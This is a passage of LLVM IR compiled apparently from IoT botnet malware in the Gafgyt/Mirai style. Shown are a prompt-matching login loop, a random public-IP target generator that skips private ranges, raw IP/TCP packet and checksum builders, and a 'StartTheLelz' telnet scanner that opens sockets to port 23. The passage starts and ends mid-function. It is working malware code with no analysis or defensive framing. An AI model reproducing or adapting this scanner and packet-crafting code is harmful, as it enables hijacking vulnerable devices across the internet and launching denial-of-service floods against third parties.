  %122 = load i32, i32* %10, align 4
  %123 = load i8*, i8** %23, align 8
  %124 = call i32 @negotiate(i32 noundef %122, i8* noundef %123, i32 noundef 3)
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %127, label %126

126:                                              ; preds = %118
  store i32 0, i32* %9, align 4
  br label %148

127:                                              ; preds = %118
  br label %142

128:                                              ; preds = %98
  %129 = load i8*, i8** %15, align 8
  %130 = load i8*, i8** %11, align 8
  %131 = call i8* @strstr(i8* noundef %129, i8* noundef %130) #11
  %132 = icmp ne i8* %131, null
  br i1 %132, label %140, label %133

133:                                              ; preds = %128
  %134 = load i32, i32* %12, align 4
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %136, label %141

136:                                              ; preds = %133
  %137 = load i8*, i8** %15, align 8
  %138 = call i32 @matchPrompt(i8* noundef %137)
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

140:                                              ; preds = %136, %128
  store i32 1, i32* %20, align 4
  br label %143

141:                                              ; preds = %136, %133
  br label %142

142:                                              ; preds = %141, %127
  br label %33, !llvm.loop !37

143:                                              ; preds = %140, %82, %48
  %144 = load i32, i32* %20, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %147

146:                                              ; preds = %143
  store i32 1, i32* %9, align 4
  br label %148

147:                                              ; preds = %143
  store i32 0, i32* %9, align 4
  br label %148

148:                                              ; preds = %147, %146, %126, %117, %97
  %149 = load i32, i32* %9, align 4
  ret i32 %149
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4 = zext i8 %3 to i32
  %5 = icmp sge i32 %4, 255
  br i1 %5, label %6, label %21

6:                                                ; preds = %0
  %7 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %8 = add i8 %7, 1
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %10 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %11 = zext i8 %10 to i32
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %13 = zext i8 %12 to i32
  %14 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = zext i8 %14 to i32
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %17 = zext i8 %16 to i32
  %18 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %9, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i64 0, i64 0), i32 noundef %11, i32 noundef %13, i32 noundef %15, i32 noundef %17)
  %19 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %20 = call i32 @inet_addr(i8* noundef %19) #12
  store i32 %20, i32* %1, align 4
  br label %234

21:                                               ; preds = %0
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %23 = zext i8 %22 to i32
  %24 = icmp sge i32 %23, 255
  br i1 %24, label %25, label %40

25:                                               ; preds = %21
  %26 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %27 = add i8 %26, 1
  store i8 %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %28 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %29 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %30 = zext i8 %29 to i32
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %36 = zext i8 %35 to i32
  %37 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %28, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i64 0, i64 0), i32 noundef %30, i32 noundef %32, i32 noundef %34, i32 noundef %36)
  %38 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %39 = call i32 @inet_addr(i8* noundef %38) #12
  store i32 %39, i32* %1, align 4
  br label %234

40:                                               ; preds = %21
  %41 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %42 = zext i8 %41 to i32
  %43 = icmp sge i32 %42, 255
  br i1 %43, label %44, label %69

44:                                               ; preds = %40
  %45 = call i32 @rand() #12
  %46 = srem i32 %45, 255
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %48 = call i32 @rand() #12
  %49 = srem i32 %48, 255
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %51 = call i32 @rand() #12
  %52 = srem i32 %51, 255
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %54 = call i32 @rand() #12
  %55 = srem i32 %54, 255
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %57 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %59 = zext i8 %58 to i32
  %60 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %61 = zext i8 %60 to i32
  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %63 = zext i8 %62 to i32
  %64 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %65 = zext i8 %64 to i32
  %66 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %57, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i64 0, i64 0), i32 noundef %59, i32 noundef %61, i32 noundef %63, i32 noundef %65)
  %67 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %68 = call i32 @inet_addr(i8* noundef %67) #12
  store i32 %68, i32* %1, align 4
  br label %234

69:                                               ; preds = %40
  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %71 = add i8 %70, 1
  store i8 %71, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %72

72:                                               ; preds = %208, %69
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %206, label %76

76:                                               ; preds = %72
  %77 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %78 = zext i8 %77 to i32
  %79 = icmp eq i32 %78, 10
  br i1 %79, label %206, label %80

80:                                               ; preds = %76
  %81 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %82 = zext i8 %81 to i32
  %83 = icmp eq i32 %82, 100
  br i1 %83, label %84, label %92

84:                                               ; preds = %80
  %85 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp sge i32 %86, 64
  br i1 %87, label %88, label %92

88:                                               ; preds = %84
  %89 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %90 = zext i8 %89 to i32
  %91 = icmp sle i32 %90, 127
  br i1 %91, label %206, label %92

92:                                               ; preds = %88, %84, %80
  %93 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %94 = zext i8 %93 to i32
  %95 = icmp eq i32 %94, 127
  br i1 %95, label %206, label %96

96:                                               ; preds = %92
  %97 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 169
  br i1 %99, label %100, label %104

100:                                              ; preds = %96
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 254
  br i1 %103, label %206, label %104

104:                                              ; preds = %100, %96
  %105 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 172
  br i1 %107, label %108, label %116

108:                                              ; preds = %104
  %109 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %110 = zext i8 %109 to i32
  %111 = icmp sle i32 %110, 16
  br i1 %111, label %112, label %116

112:                                              ; preds = %108
  %113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %114 = zext i8 %113 to i32
  %115 = icmp sle i32 %114, 31
  br i1 %115, label %206, label %116

116:                                              ; preds = %112, %108, %104
  %117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 192
  br i1 %119, label %120, label %128

120:                                              ; preds = %116
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 0
  br i1 %123, label %124, label %128

124:                                              ; preds = %120
  %125 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 2
  br i1 %127, label %206, label %128

128:                                              ; preds = %124, %120, %116
  %129 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 192
  br i1 %131, label %132, label %140

132:                                              ; preds = %128
  %133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %134, 88
  br i1 %135, label %136, label %140

136:                                              ; preds = %132
  %137 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 99
  br i1 %139, label %206, label %140

140:                                              ; preds = %136, %132, %128
  %141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %142 = zext i8 %141 to i32
  %143 = icmp eq i32 %142, 192
  br i1 %143, label %144, label %148

144:                                              ; preds = %140
  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 168
  br i1 %147, label %206, label %148

148:                                              ; preds = %144, %140
  %149 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 198
  br i1 %151, label %152, label %160

152:                                              ; preds = %148
  %153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 18
  br i1 %155, label %206, label %156

156:                                              ; preds = %152
  %157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %158 = zext i8 %157 to i32
  %159 = icmp eq i32 %158, 19
  br i1 %159, label %206, label %160

160:                                              ; preds = %156, %148
  %161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 198
  br i1 %163, label %164, label %172

164:                                              ; preds = %160
  %165 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 51
  br i1 %167, label %168, label %172

168:                                              ; preds = %164
  %169 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 100
  br i1 %171, label %206, label %172

172:                                              ; preds = %168, %164, %160
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %174 = zext i8 %173 to i32
  %175 = icmp eq i32 %174, 203
  br i1 %175, label %176, label %184

176:                                              ; preds = %172
  %177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 0
  br i1 %179, label %180, label %184

180:                                              ; preds = %176
  %181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 113
  br i1 %183, label %206, label %184

184:                                              ; preds = %180, %176, %172
  %185 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %186 = zext i8 %185 to i32
  %187 = icmp sge i32 %186, 224
  br i1 %187, label %206, label %188

188:                                              ; preds = %184
  %189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %190 = zext i8 %189 to i32
  %191 = icmp eq i32 %190, 185
  br i1 %191, label %192, label %196

192:                                              ; preds = %188
  %193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 62
  br i1 %195, label %206, label %196

196:                                              ; preds = %192, %188
  %197 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %198 = zext i8 %197 to i32
  %199 = icmp eq i32 %198, 208
  br i1 %199, label %200, label %204

200:                                              ; preds = %196
  %201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %202 = zext i8 %201 to i32
  %203 = icmp eq i32 %202, 67
  br label %204

204:                                              ; preds = %200, %196
  %205 = phi i1 [ false, %196 ], [ %203, %200 ]
  br label %206

206:                                              ; preds = %204, %192, %184, %180, %168, %156, %152, %144, %136, %124, %112, %100, %92, %88, %76, %72
  %207 = phi i1 [ true, %192 ], [ true, %184 ], [ true, %180 ], [ true, %168 ], [ true, %156 ], [ true, %152 ], [ true, %144 ], [ true, %136 ], [ true, %124 ], [ true, %112 ], [ true, %100 ], [ true, %92 ], [ true, %88 ], [ true, %76 ], [ true, %72 ], [ %205, %204 ]
  br i1 %207, label %208, label %221

208:                                              ; preds = %206
  %209 = call i32 @rand() #12
  %210 = srem i32 %209, 255
  %211 = trunc i32 %210 to i8
  store i8 %211, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %212 = call i32 @rand() #12
  %213 = srem i32 %212, 255
  %214 = trunc i32 %213 to i8
  store i8 %214, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %215 = call i32 @rand() #12
  %216 = srem i32 %215, 255
  %217 = trunc i32 %216 to i8
  store i8 %217, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %218 = call i32 @rand() #12
  %219 = srem i32 %218, 255
  %220 = trunc i32 %219 to i8
  store i8 %220, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %72, !llvm.loop !38

221:                                              ; preds = %206
  %222 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %224 = zext i8 %223 to i32
  %225 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %226 = zext i8 %225 to i32
  %227 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %228 = zext i8 %227 to i32
  %229 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %230 = zext i8 %229 to i32
  %231 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %222, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i64 0, i64 0), i32 noundef %224, i32 noundef %226, i32 noundef %228, i32 noundef %230)
  %232 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %233 = call i32 @inet_addr(i8* noundef %232) #12
  store i32 %233, i32* %1, align 4
  br label %234

234:                                              ; preds = %221, %44, %25, %6
  %235 = load i32, i32* %1, align 4
  ret i32 %235
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getRandomIP(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 noundef %4) #15
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #8

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @csum(i16* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !39

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !40

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* noundef %0, %struct.tcphdr* noundef %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 noundef zeroext 20) #15
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 noundef %28) #12
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 8 %33, i64 24, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 %38, i64 20, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* noundef %39, i32 noundef %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* noundef %43) #12
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #9

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* noundef %0, i32 noundef %1, i32 noundef %2, i8 noundef zeroext %3, i32 noundef %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @sclose(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

6:                                                ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

7:                                                ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 noundef %8)
  store i32 0, i32* %2, align 4
  br label %10

10:                                               ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.__sigset_t*, align 8
  %15 = call i32 @getdtablesize() #12
  %16 = sdiv i32 %15, 4
  %17 = mul nsw i32 %16, 3
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* %1, align 4
  %19 = icmp sgt i32 %18, 512
  br i1 %19, label %20, label %21

20:                                               ; preds = %0
  br label %23

21:                                               ; preds = %0
  %22 = load i32, i32* %1, align 4
  br label %23

23:                                               ; preds = %21, %20
  %24 = phi i32 [ 512, %20 ], [ %22, %21 ]
  store i32 %24, i32* %1, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = call zeroext i16 @htons(i16 noundef zeroext 23) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %29 = getelementptr inbounds [8 x i8], [8 x i8]* %28, i64 0, i64 0
